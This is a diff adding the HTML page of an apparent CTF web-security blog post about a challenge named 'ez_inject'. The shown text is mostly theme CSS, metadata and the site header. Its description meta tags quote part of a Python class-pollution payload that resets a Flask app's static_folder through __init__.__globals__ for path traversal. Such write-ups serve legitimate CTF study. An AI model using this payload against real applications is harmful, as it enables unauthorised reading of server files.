@@ -1,0 +1,2267 @@
+<!DOCTYPE html>
+<html>
+<head><!-- hexo injector head_begin start -->
+<meta name="theme-color" content="#111417">
+<meta name="color-scheme" content="dark">
+<script>
+  document.documentElement.lang = 'zh-CN';
+  document.documentElement.classList.add('js');
+</script>
+<!-- hexo injector head_begin end -->
+  <meta charset="utf-8">
+  
+  
+  <title>学学 | TYBOYKALI&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="ez_inject 随便注册一个账号 登录进去发现提示  提示污染密钥 大佬的非预期解 1&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;app&quot; : &#123;&quot;static_folder&quot; :&quot;.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&quot; &#125;&#125;&amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="学学">
+<meta property="og:url" content="https://tyboykali.github.io/2026/05/11/xue-xue/index.html">
+<meta property="og:site_name" content="TYBOYKALI&#39;s Blog">
+<meta property="og:description" content="ez_inject 随便注册一个账号 登录进去发现提示  提示污染密钥 大佬的非预期解 1&quot;__init__&quot;:&#123;&quot;__globals__&quot;:&#123;&quot;app&quot; : &#123;&quot;static_folder&quot; :&quot;.&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;&quot; &#125;&#125;&amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260506195451803.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260506195617441.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260506203220019.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260506205534655.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260506211100617.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260506211200550.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260508210412057.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260508210526507.png">
+<meta property="og:image" content="https://tyboykali.github.io/images/image-20260606172003770.png">
+<meta property="article:published_time" content="2026-05-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-07-25T04:44:46.629Z">
+<meta property="article:author" content="TYBOYKALI">
+<meta property="article:tag" content="CTF, Web Security, Security Research, Notes">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tyboykali.github.io/images/image-20260506195451803.png">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+  <script src="/live2d/libs/pixi.min.js"></script>
+  <script src="/live2d/libs/live2dcubismcore.min.js"></script>
+  <script src="/live2d/libs/pixi-live2d-display.js"></script>
+  <style>
+    #live2dCanvas { position:fixed; bottom:0; right:0; z-index:9999; pointer-events:none; width:390px; height:380px; }
+  </style>
+<!-- hexo injector head_end start -->
+<style id="geek-style">
+:root {
+  --gk-bg: #111417;
+  --gk-surface: #15191d;
+  --gk-surface-raised: #1a1f24;
+  --gk-surface-code: #0d1012;
+  --gk-border: #293038;
+  --gk-border-strong: #39434d;
+  --gk-text: #d5d9dc;
+  --gk-text-strong: #f0f2f3;
+  --gk-muted: #7f8992;
+  --gk-green: #72d49b;
+  --gk-cyan: #67c5d8;
+  --gk-amber: #d6a85f;
+  --gk-red: #c87373;
+  --gk-mono: "Cascadia Code", "JetBrains Mono", "SFMono-Regular", Consolas, "Liberation Mono", monospace;
+  --gk-reading: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", "Microsoft YaHei", sans-serif;
+}
+
+* {
+  box-sizing: border-box;
+}
+
+html {
+  background: var(--gk-bg);
+  color-scheme: dark;
+  scroll-behavior: smooth;
+}
+
+body {
+  background: var(--gk-bg) !important;
+  color: var(--gk-text) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 15px;
+  line-height: 1.65;
+}
+
+#container,
+#wrap,
+#main,
+#sidebar {
+  background: transparent !important;
+}
+
+.outer {
+  max-width: 1180px;
+}
+
+a {
+  color: var(--gk-cyan);
+  text-decoration: none;
+  transition: color 150ms ease, border-color 150ms ease, background-color 150ms ease;
+}
+
+a:hover {
+  color: var(--gk-green);
+}
+
+a:focus-visible,
+button:focus-visible,
+input:focus-visible {
+  outline: 2px solid var(--gk-cyan);
+  outline-offset: 3px;
+}
+
+::selection {
+  background: rgba(103, 197, 216, 0.24);
+  color: var(--gk-text-strong);
+}
+
+::-webkit-scrollbar {
+  width: 9px;
+  height: 9px;
+}
+
+::-webkit-scrollbar-track {
+  background: var(--gk-bg);
+}
+
+::-webkit-scrollbar-thumb {
+  background: var(--gk-border-strong);
+  border: 2px solid var(--gk-bg);
+}
+
+/* Header */
+#header {
+  height: 224px !important;
+  overflow: hidden;
+  background: var(--gk-bg) !important;
+  border-top: 2px solid var(--gk-green);
+  border-bottom: 1px solid var(--gk-border) !important;
+}
+
+#header::after {
+  position: absolute;
+  right: max(24px, calc((100% - 1180px) / 2));
+  bottom: 28px;
+  width: 76px;
+  height: 1px;
+  background: var(--gk-border-strong);
+  content: "";
+}
+
+#banner {
+  display: none !important;
+}
+
+#header-title {
+  top: 50% !important;
+  height: auto !important;
+  margin-top: -25px !important;
+}
+
+#logo-wrap,
+#subtitle-wrap {
+  margin: 0;
+}
+
+#logo {
+  color: var(--gk-text-strong) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 31px !important;
+  font-weight: 600 !important;
+  line-height: 1.2 !important;
+  letter-spacing: 0 !important;
+  text-shadow: none !important;
+}
+
+#logo::before {
+  margin-right: 10px;
+  color: var(--gk-green);
+  content: "~/";
+  font-weight: 400;
+}
+
+#subtitle-wrap {
+  margin-top: 12px !important;
+}
+
+#subtitle {
+  color: var(--gk-muted) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 12px !important;
+  font-weight: 500 !important;
+  line-height: 1 !important;
+  letter-spacing: 0 !important;
+  text-shadow: none !important;
+}
+
+#header-inner {
+  overflow: visible;
+}
+
+#main-nav,
+#sub-nav {
+  font-family: var(--gk-mono);
+}
+
+.main-nav-link,
+.nav-icon {
+  height: 54px;
+  padding: 17px 14px !important;
+  color: var(--gk-muted) !important;
+  font-size: 13px !important;
+  font-weight: 500 !important;
+  line-height: 20px;
+  letter-spacing: 0 !important;
+  opacity: 1 !important;
+  text-shadow: none !important;
+}
+
+.main-nav-link::before {
+  margin-right: 6px;
+  color: var(--gk-border-strong);
+  content: "/";
+}
+
+.main-nav-link:hover,
+.nav-icon:hover {
+  color: var(--gk-green) !important;
+}
+
+#main-nav-toggle {
+  border: 0;
+}
+
+#search-form-wrap {
+  top: 12px;
+  height: 34px;
+}
+
+.search-form {
+  padding: 6px 34px 6px 12px !important;
+  background: var(--gk-surface) !important;
+  border: 1px solid var(--gk-border) !important;
+  border-radius: 3px !important;
+}
+
+.search-form-input,
+.search-form-submit {
+  color: var(--gk-text) !important;
+  font-family: var(--gk-mono) !important;
+}
+
+.search-form-input::placeholder {
+  color: var(--gk-muted);
+}
+
+/* Main layout */
+#wrap > .outer {
+  display: flow-root;
+  padding-top: 42px;
+  padding-bottom: 88px;
+}
+
+#main {
+  width: calc(100% - 320px);
+}
+
+#sidebar {
+  width: 276px;
+}
+
+/* Homepage */
+.home-dashboard {
+  overflow: hidden;
+  margin-bottom: 42px;
+  background: var(--gk-surface);
+  border: 1px solid var(--gk-border);
+  border-radius: 4px;
+}
+
+.home-terminal-bar {
+  display: flex;
+  align-items: center;
+  height: 38px;
+  padding: 0 14px;
+  background: #0e1113;
+  border-bottom: 1px solid var(--gk-border);
+}
+
+.terminal-dot {
+  width: 7px;
+  height: 7px;
+  margin-right: 7px;
+  border-radius: 50%;
+}
+
+.terminal-dot-red { background: var(--gk-red); }
+.terminal-dot-amber { background: var(--gk-amber); }
+.terminal-dot-green { background: var(--gk-green); }
+
+.terminal-path {
+  margin-left: auto;
+  color: #5e6871;
+  font-size: 10px;
+}
+
+.home-intro {
+  padding: 34px 36px 30px;
+}
+
+.home-prompt {
+  margin: 0 0 14px;
+  color: var(--gk-green);
+  font-size: 12px;
+}
+
+.home-prompt::after {
+  display: inline-block;
+  width: 7px;
+  height: 14px;
+  margin-left: 7px;
+  vertical-align: -2px;
+  background: var(--gk-green);
+  content: "";
+  animation: gk-blink 1.2s steps(1) infinite;
+}
+
+@keyframes gk-blink {
+  50% { opacity: 0; }
+}
+
+.home-intro h2 {
+  max-width: 680px;
+  margin: 0;
+  color: var(--gk-text-strong);
+  font-family: var(--gk-reading);
+  font-size: 28px;
+  font-weight: 650;
+  line-height: 1.35;
+  letter-spacing: 0;
+}
+
+.home-summary {
+  margin: 12px 0 0;
+  color: var(--gk-muted);
+  font-family: var(--gk-reading);
+  font-size: 15px;
+}
+
+.home-status {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 8px 24px;
+  margin-top: 30px;
+  padding-top: 18px;
+  border-top: 1px solid var(--gk-border);
+  color: var(--gk-muted);
+  font-size: 11px;
+}
+
+.home-status span {
+  white-space: nowrap;
+}
+
+.home-status b {
+  color: var(--gk-text);
+  font-weight: 500;
+}
+
+.home-status i {
+  display: inline-block;
+  width: 6px;
+  height: 6px;
+  margin-right: 6px;
+  background: var(--gk-green);
+  border-radius: 50%;
+  box-shadow: 0 0 0 3px rgba(114, 212, 155, 0.1);
+}
+
+.notes-index {
+  margin-bottom: 28px;
+}
+
+.section-heading {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 14px;
+}
+
+.section-heading h2 {
+  margin: 0;
+  color: var(--gk-cyan);
+  font-size: 12px;
+  font-weight: 600;
+  letter-spacing: 0;
+}
+
+.section-heading > a {
+  color: var(--gk-muted);
+  font-size: 11px;
+}
+
+.section-heading > a:hover {
+  color: var(--gk-green);
+}
+
+.notes-list {
+  border-top: 1px solid var(--gk-border-strong);
+}
+
+.note-row {
+  margin: 0;
+  border-bottom: 1px solid var(--gk-border);
+}
+
+.note-link {
+  display: grid;
+  grid-template-columns: 92px 30px minmax(0, 1fr) 24px;
+  align-items: center;
+  min-height: 64px;
+  padding: 8px 12px;
+  color: var(--gk-text) !important;
+}
+
+.note-link:hover {
+  background: var(--gk-surface);
+}
+
+.note-link time,
+.note-index {
+  color: var(--gk-muted);
+  font-size: 11px;
+}
+
+.note-index {
+  color: #56616a;
+}
+
+.note-link h3 {
+  overflow: hidden;
+  margin: 0;
+  color: var(--gk-text);
+  font-family: var(--gk-reading);
+  font-size: 16px;
+  font-weight: 560;
+  line-height: 1.35;
+  letter-spacing: 0;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+
+.note-arrow {
+  color: var(--gk-border-strong);
+  font-size: 15px;
+  text-align: right;
+  transition: color 150ms ease, transform 150ms ease;
+}
+
+.note-link:hover .note-arrow {
+  color: var(--gk-green);
+  transform: translate(2px, -2px);
+}
+
+/* Posts and pages */
+.article {
+  margin-bottom: 28px !important;
+  padding: 30px 34px !important;
+  background: var(--gk-surface) !important;
+  border: 1px solid var(--gk-border) !important;
+  border-radius: 4px !important;
+  box-shadow: none !important;
+}
+
+.article-inner {
+  overflow: visible !important;
+  background: transparent !important;
+  border: 0 !important;
+  border-radius: 0 !important;
+  box-shadow: none !important;
+}
+
+.article-header {
+  margin-bottom: 22px;
+  padding: 0 !important;
+}
+
+.article-title,
+.article-title a {
+  color: var(--gk-text-strong) !important;
+  font-family: var(--gk-reading) !important;
+  font-size: 27px !important;
+  font-weight: 680 !important;
+  line-height: 1.35 !important;
+  letter-spacing: 0 !important;
+  text-shadow: none !important;
+}
+
+.article-title a:hover {
+  color: var(--gk-green) !important;
+}
+
+.article-meta,
+.article-date {
+  color: var(--gk-muted) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 11px !important;
+}
+
+.article-date::before {
+  margin-right: 5px;
+  color: var(--gk-green);
+  content: "//";
+}
+
+.article-entry {
+  padding: 0 !important;
+  color: #c9ced2 !important;
+  font-family: var(--gk-reading) !important;
+  font-size: 17px !important;
+  line-height: 1.85 !important;
+}
+
+.article-entry p,
+.article-entry li {
+  color: #c9ced2 !important;
+}
+
+.article-entry h1,
+.article-entry h2,
+.article-entry h3,
+.article-entry h4,
+.article-entry h5,
+.article-entry h6 {
+  color: var(--gk-text-strong) !important;
+  font-family: var(--gk-reading) !important;
+  font-weight: 680 !important;
+  letter-spacing: 0 !important;
+}
+
+.article-entry h2 {
+  margin-top: 2em !important;
+  padding-bottom: 9px;
+  border-bottom: 1px solid var(--gk-border) !important;
+}
+
+.article-entry h2::before,
+.article-entry h3::before {
+  margin-right: 8px;
+  color: var(--gk-green);
+  font-family: var(--gk-mono);
+  font-size: 0.72em;
+  font-weight: 500;
+}
+
+.article-entry h2::before { content: "##"; }
+.article-entry h3::before { content: "###"; }
+
+.article-entry .headerlink {
+  margin-left: 8px;
+  color: var(--gk-border-strong) !important;
+  opacity: 0;
+}
+
+.article-entry h1:hover .headerlink,
+.article-entry h2:hover .headerlink,
+.article-entry h3:hover .headerlink,
+.article-entry h4:hover .headerlink {
+  opacity: 1;
+}
+
+.article-entry a {
+  color: var(--gk-cyan) !important;
+  border-bottom: 1px solid rgba(103, 197, 216, 0.32);
+}
+
+.article-entry a:hover {
+  color: var(--gk-green) !important;
+  border-bottom-color: var(--gk-green);
+}
+
+.article-entry strong {
+  color: var(--gk-text-strong) !important;
+}
+
+.article-entry em {
+  color: var(--gk-amber) !important;
+}
+
+.article-entry blockquote {
+  margin: 1.6em 0 !important;
+  padding: 10px 18px !important;
+  background: #13181a !important;
+  border-left: 2px solid var(--gk-green) !important;
+  color: var(--gk-muted) !important;
+  font-style: normal !important;
+}
+
+.article-entry li::marker {
+  color: var(--gk-green);
+}
+
+.article-entry img {
+  max-width: 100%;
+  padding: 3px;
+  background: var(--gk-bg);
+  border: 1px solid var(--gk-border) !important;
+  border-radius: 3px !important;
+}
+
+.article-entry hr {
+  height: 1px !important;
+  margin: 32px 0 !important;
+  background: var(--gk-border) !important;
+  border: 0 !important;
+}
+
+.article-entry table:not(.highlight table) {
+  width: 100%;
+  background: var(--gk-bg) !important;
+  border: 1px solid var(--gk-border) !important;
+  border-collapse: collapse;
+  font-size: 13px;
+}
+
+.article-entry th,
+.article-entry td {
+  padding: 9px 12px !important;
+  border: 1px solid var(--gk-border) !important;
+}
+
+.article-entry th {
+  background: var(--gk-surface-raised) !important;
+  color: var(--gk-green) !important;
+  font-family: var(--gk-mono);
+}
+
+.article-footer {
+  margin-top: 24px !important;
+  margin-right: 0 !important;
+  margin-left: 0 !important;
+  margin-bottom: 0 !important;
+  padding-top: 14px !important;
+  border-top: 1px solid var(--gk-border) !important;
+}
+
+.article-more-link a {
+  display: inline-flex;
+  align-items: center;
+  min-height: 32px;
+  padding: 5px 10px !important;
+  background: transparent !important;
+  border: 1px solid var(--gk-border-strong) !important;
+  border-radius: 3px !important;
+  color: var(--gk-green) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 11px !important;
+}
+
+.article-more-link a:hover {
+  background: rgba(114, 212, 155, 0.06) !important;
+  border-color: var(--gk-green) !important;
+}
+
+.article-more-link a::before {
+  margin-right: 6px;
+  content: "$";
+}
+
+.article-nav {
+  background: var(--gk-surface) !important;
+  border: 1px solid var(--gk-border) !important;
+  box-shadow: none !important;
+}
+
+.article-nav-link-wrap {
+  color: var(--gk-muted) !important;
+}
+
+.article-nav-caption,
+.article-nav-title {
+  color: inherit !important;
+}
+
+/* Code */
+.article-entry figure.highlight {
+  position: relative;
+  overflow: hidden !important;
+  width: 100% !important;
+  margin: 20px 0 !important;
+  background: var(--gk-surface-code) !important;
+  border: 1px solid var(--gk-border) !important;
+  border-radius: 4px !important;
+}
+
+.article-entry figure.highlight table {
+  width: 100% !important;
+  margin: 0 !important;
+  table-layout: fixed !important;
+  border: 0 !important;
+}
+
+.article-entry figure.highlight td {
+  padding: 0 !important;
+  border: 0 !important;
+}
+
+.article-entry figure.highlight .gutter {
+  width: 44px !important;
+  background: #0a0d0f !important;
+  border-right: 1px solid #222930 !important;
+}
+
+.article-entry figure.highlight .gutter pre {
+  padding: 13px 9px !important;
+  color: #47515a !important;
+  text-align: right;
+}
+
+.article-entry figure.highlight .code {
+  overflow-x: auto !important;
+}
+
+.article-entry figure.highlight pre,
+.article-entry figure.highlight code {
+  background: transparent !important;
+  border: 0 !important;
+  color: var(--gk-text) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 13px !important;
+  line-height: 1.65 !important;
+  white-space: pre !important;
+  word-break: normal !important;
+}
+
+.article-entry figure.highlight .code pre {
+  padding: 13px 50px 13px 15px !important;
+}
+
+.article-entry code:not(figure code) {
+  padding: 2px 5px !important;
+  background: rgba(114, 212, 155, 0.07) !important;
+  border: 1px solid rgba(114, 212, 155, 0.16) !important;
+  border-radius: 3px !important;
+  color: var(--gk-green) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 0.88em !important;
+}
+
+.highlight .comment,
+.highlight .quote { color: #65707a !important; font-style: italic; }
+.highlight .keyword,
+.highlight .selector-tag,
+.highlight .section { color: #d497b8 !important; }
+.highlight .title,
+.highlight .function .title { color: #75acd8 !important; }
+.highlight .string,
+.highlight .attribute,
+.highlight .addition,
+.highlight .variable { color: var(--gk-green) !important; }
+.highlight .number,
+.highlight .literal,
+.highlight .type,
+.highlight .params { color: var(--gk-amber) !important; }
+.highlight .meta,
+.highlight .built_in { color: var(--gk-cyan) !important; }
+.highlight .deletion { color: var(--gk-red) !important; }
+
+/* Sidebar */
+.widget-wrap {
+  margin: 0 0 30px !important;
+  padding: 0 !important;
+  background: transparent !important;
+  border: 0 !important;
+  border-radius: 0 !important;
+}
+
+.widget-title {
+  margin: 0 0 10px !important;
+  padding: 0 0 8px !important;
+  color: var(--gk-cyan) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 11px !important;
+  font-weight: 600 !important;
+  letter-spacing: 0 !important;
+  text-transform: uppercase;
+  border-bottom: 1px solid var(--gk-border) !important;
+}
+
+.widget-title::before {
+  margin-right: 6px;
+  color: var(--gk-green);
+  content: "//";
+}
+
+.widget {
+  padding: 0 !important;
+  background: transparent !important;
+  border: 0 !important;
+  border-radius: 0 !important;
+  box-shadow: none !important;
+  color: var(--gk-muted) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 12px !important;
+}
+
+.widget ul,
+.widget ol {
+  margin: 0 !important;
+  padding: 0 !important;
+}
+
+.widget li {
+  position: relative;
+  padding: 5px 0 5px 13px;
+  border-bottom: 1px solid #1d2328;
+}
+
+.widget li::before {
+  position: absolute;
+  left: 0;
+  color: #4b565f;
+  content: "›";
+}
+
+.widget a {
+  color: var(--gk-muted) !important;
+}
+
+.widget a:hover {
+  color: var(--gk-green) !important;
+}
+
+.archive-list-count,
+.category-list-count,
+.tag-list-count {
+  color: #56616a !important;
+  font-size: 9px !important;
+}
+
+.tagcloud a {
+  display: inline-block;
+  margin: 0 5px 6px 0;
+  padding: 3px 6px;
+  border: 1px solid var(--gk-border);
+  border-radius: 2px;
+  font-size: 11px !important;
+}
+
+/* Archives */
+.archives-wrap {
+  margin: 0 0 36px !important;
+}
+
+.archive-year-wrap {
+  margin-bottom: 12px !important;
+}
+
+.archive-year {
+  color: var(--gk-cyan) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 14px !important;
+}
+
+.archive-year::before {
+  margin-right: 7px;
+  color: var(--gk-green);
+  content: "/";
+}
+
+.archives {
+  column-gap: 12px !important;
+}
+
+.archive-article-inner {
+  margin-bottom: 12px !important;
+  padding: 13px 14px !important;
+  background: var(--gk-surface) !important;
+  border: 1px solid var(--gk-border) !important;
+  border-radius: 3px !important;
+  box-shadow: none !important;
+}
+
+.archive-article-date {
+  margin-bottom: 6px !important;
+  color: var(--gk-muted) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 10px !important;
+}
+
+.archive-article-title,
+.archive-article-title a {
+  color: var(--gk-text) !important;
+  font-family: var(--gk-reading) !important;
+  font-size: 14px !important;
+  font-weight: 600 !important;
+  line-height: 1.45 !important;
+}
+
+.archive-article-title a:hover {
+  color: var(--gk-green) !important;
+}
+
+#page-nav {
+  overflow: hidden;
+  margin: 28px auto !important;
+  background: var(--gk-surface) !important;
+  border: 1px solid var(--gk-border) !important;
+  border-radius: 3px !important;
+  box-shadow: none !important;
+  color: var(--gk-muted) !important;
+  font-family: var(--gk-mono) !important;
+}
+
+#page-nav a,
+#page-nav span {
+  color: var(--gk-muted) !important;
+}
+
+#page-nav a:hover,
+#page-nav .current {
+  background: var(--gk-surface-raised) !important;
+  color: var(--gk-green) !important;
+}
+
+/* TOC and utility components */
+.article-toc-sidebar {
+  background: rgba(17, 20, 23, 0.97) !important;
+  border: 1px solid var(--gk-border) !important;
+  border-radius: 3px !important;
+  box-shadow: none !important;
+}
+
+.toc-title {
+  color: var(--gk-cyan) !important;
+  border-bottom-color: var(--gk-border) !important;
+}
+
+.toc-item a {
+  color: var(--gk-muted) !important;
+  border-radius: 2px !important;
+}
+
+.toc-item a:hover,
+.toc-item.active a {
+  background: rgba(114, 212, 155, 0.07) !important;
+  color: var(--gk-green) !important;
+}
+
+#mobile-nav {
+  background: var(--gk-surface) !important;
+  border-right: 1px solid var(--gk-border);
+}
+
+.mobile-nav-link {
+  color: var(--gk-muted) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 12px !important;
+}
+
+#live2dCanvas {
+  right: 12px !important;
+  z-index: 20 !important;
+  width: 240px !important;
+  height: 234px !important;
+  opacity: 0.86;
+  filter: saturate(0.82) contrast(0.96);
+}
+
+/* Footer */
+#footer {
+  padding: 22px 0 70px !important;
+  background: #0e1113 !important;
+  border-top: 1px solid var(--gk-border) !important;
+  color: var(--gk-muted) !important;
+  font-family: var(--gk-mono) !important;
+  font-size: 11px !important;
+}
+
+#footer-info {
+  color: var(--gk-muted) !important;
+  line-height: 1.8;
+}
+
+#footer-info a {
+  color: var(--gk-cyan) !important;
+}
+
+@media (max-width: 1100px) {
+  .outer {
+    width: calc(100% - 40px);
+  }
+
+  #main {
+    width: calc(100% - 286px);
+  }
+
+  #sidebar {
+    width: 250px;
+  }
+
+  #live2dCanvas {
+    width: 205px !important;
+    height: 200px !important;
+  }
+}
+
+@media (max-width: 820px) {
+  #header {
+    height: 188px !important;
+  }
+
+  #header-title {
+    margin-top: -20px !important;
+  }
+
+  #logo {
+    font-size: 26px !important;
+  }
+
+  #wrap > .outer {
+    padding-top: 28px;
+  }
+
+  #main,
+  #sidebar {
+    float: none !important;
+    width: 100% !important;
+  }
+
+  #sidebar {
+    display: grid;
+    grid-template-columns: repeat(2, minmax(0, 1fr));
+    gap: 20px;
+    margin-top: 42px;
+  }
+
+  #live2dCanvas {
+    display: none !important;
+  }
+}
+
+@media (max-width: 600px) {
+  body {
+    font-size: 14px;
+  }
+
+  .outer {
+    width: calc(100% - 28px);
+  }
+
+  #header {
+    height: 170px !important;
+  }
+
+  #header-title {
+    margin-top: -14px !important;
+  }
+
+  #logo {
+    font-size: 22px !important;
+  }
+
+  #logo::before {
+    margin-right: 6px;
+  }
+
+  #subtitle {
+    font-size: 10px !important;
+  }
+
+  #main-nav-toggle {
+    display: block;
+  }
+
+  #wrap > .outer {
+    padding-top: 20px;
+    padding-bottom: 64px;
+  }
+
+  .home-dashboard {
+    margin-bottom: 30px;
+  }
+
+  .home-intro {
+    padding: 26px 20px 22px;
+  }
+
+  .home-intro h2 {
+    font-size: 23px;
+  }
+
+  .home-summary {
+    font-size: 14px;
+  }
+
+  .home-status {
+    gap: 7px 15px;
+    margin-top: 24px;
+  }
+
+  .home-status span:last-child {
+    width: 100%;
+  }
+
+  .note-link {
+    grid-template-columns: 26px minmax(0, 1fr) 20px;
+    min-height: 60px;
+    padding: 8px 6px;
+  }
+
+  .note-link time {
+    display: none;
+  }
+
+  .note-link h3 {
+    font-size: 15px;
+  }
+
+  .article {
+    padding: 22px 18px !important;
+  }
+
+  .article-title,
+  .article-title a {
+    font-size: 23px !important;
+  }
+
+  .article-entry {
+    font-size: 16px !important;
+    line-height: 1.8 !important;
+  }
+
+  .article-entry figure.highlight {
+    width: calc(100% + 20px) !important;
+    margin-right: -10px !important;
+    margin-left: -10px !important;
+  }
+
+  #sidebar {
+    display: block;
+  }
+
+  .widget-wrap {
+    margin-bottom: 26px !important;
+  }
+
+  #footer {
+    padding-bottom: 68px !important;
+  }
+}
+
+@media (prefers-reduced-motion: reduce) {
+  html {
+    scroll-behavior: auto;
+  }
+
+  *,
+  *::before,
+  *::after {
+    animation-duration: 0.01ms !important;
+    animation-iteration-count: 1 !important;
+    transition-duration: 0.01ms !important;
+  }
+}
+</style>
+
+<style>
+#music-player {
+  position: fixed;
+  bottom: 14px;
+  left: 14px;
+  z-index: 9997;
+  display: grid;
+  grid-template-columns: auto minmax(80px, 1fr) auto auto;
+  align-items: center;
+  gap: 8px;
+  width: min(336px, calc(100vw - 28px));
+  height: 50px;
+  padding: 6px 8px;
+  overflow: hidden;
+  background: rgba(14, 17, 19, 0.96);
+  border: 1px solid var(--gk-border);
+  border-radius: 4px;
+  box-shadow: 0 10px 30px rgba(0, 0, 0, 0.28);
+  backdrop-filter: blur(12px);
+  font-family: var(--gk-mono);
+}
+
+.player-row {
+  display: flex;
+  align-items: center;
+  gap: 3px;
+}
+
+.player-btn {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  flex: 0 0 auto;
+  width: 30px;
+  height: 30px;
+  padding: 0;
+  background: transparent;
+  border: 1px solid transparent;
+  border-radius: 3px;
+  color: var(--gk-muted);
+  cursor: pointer;
+  font-size: 12px;
+  transition: color 150ms ease, background-color 150ms ease, border-color 150ms ease;
+}
+
+.player-btn:hover {
+  background: var(--gk-surface-raised);
+  border-color: var(--gk-border);
+  color: var(--gk-text-strong);
+}
+
+.player-btn.play-btn {
+  background: rgba(114, 212, 155, 0.08);
+  border-color: rgba(114, 212, 155, 0.22);
+  color: var(--gk-green);
+}
+
+.player-info {
+  min-width: 0;
+  overflow: hidden;
+}
+
+.player-title,
+.player-time {
+  display: block;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+
+.player-title {
+  color: var(--gk-text);
+  font-size: 11px;
+  line-height: 1.35;
+}
+
+.player-time {
+  margin-top: 2px;
+  color: var(--gk-muted);
+  font-size: 9px;
+  line-height: 1.2;
+}
+
+.player-volume-wrap {
+  display: flex;
+  align-items: center;
+  gap: 5px;
+  color: var(--gk-muted);
+  font-size: 10px;
+}
+
+.player-volume {
+  width: 54px;
+  height: 3px;
+  margin: 0;
+  appearance: none;
+  background: var(--gk-border-strong);
+  border: 0;
+  border-radius: 0;
+  cursor: pointer;
+}
+
+.player-volume::-webkit-slider-thumb {
+  width: 9px;
+  height: 9px;
+  appearance: none;
+  background: var(--gk-cyan);
+  border: 0;
+  border-radius: 50%;
+}
+
+#player-playlist {
+  position: fixed;
+  bottom: 72px;
+  left: 14px;
+  z-index: 9999;
+  display: none;
+  width: min(336px, calc(100vw - 28px));
+  max-height: min(360px, calc(100vh - 100px));
+  overflow-y: auto;
+  padding: 6px;
+  background: rgba(14, 17, 19, 0.98);
+  border: 1px solid var(--gk-border);
+  border-radius: 4px;
+  box-shadow: 0 14px 40px rgba(0, 0, 0, 0.38);
+  backdrop-filter: blur(12px);
+  font-family: var(--gk-mono);
+}
+
+#player-playlist.show {
+  display: block;
+}
+
+body:has(#container.mobile-nav-on) #music-player,
+body:has(#container.mobile-nav-on) #player-playlist {
+  opacity: 0;
+  pointer-events: none;
+  transform: translateY(8px);
+}
+
+#player-playlist .pl-item {
+  overflow: hidden;
+  padding: 8px 10px;
+  border-left: 2px solid transparent;
+  color: var(--gk-muted);
+  cursor: pointer;
+  font-size: 10px;
+  line-height: 1.35;
+  text-overflow: ellipsis;
+  white-space: nowrap;
+}
+
+#player-playlist .pl-item:hover {
+  background: var(--gk-surface-raised);
+  color: var(--gk-text);
+}
+
+#player-playlist .pl-item.active {
+  background: rgba(114, 212, 155, 0.06);
+  border-left-color: var(--gk-green);
+  color: var(--gk-green);
+}
+
+@media (max-width: 600px) {
+  #music-player {
+    grid-template-columns: auto minmax(74px, 1fr) auto;
+    height: 46px;
+    padding: 5px 6px;
+  }
+
+  .player-volume-wrap {
+    display: none;
+  }
+
+  .player-btn {
+    width: 28px;
+    height: 28px;
+  }
+
+  #player-playlist {
+    bottom: 66px;
+  }
+}
+</style>
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">TYBOYKALI&#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">CTF / WEB SECURITY / NOTES</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">首页</a>
+        
+          <a class="main-nav-link" href="/archives/">归档</a>
+        
+          <a class="main-nav-link" href="/links/">友链</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          
+            <a class="nav-icon" target="_blank" rel="noopener" href="https://github.com/TYBOYKALI"><span class="fa fa-github"></span></a>
+          
+        
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
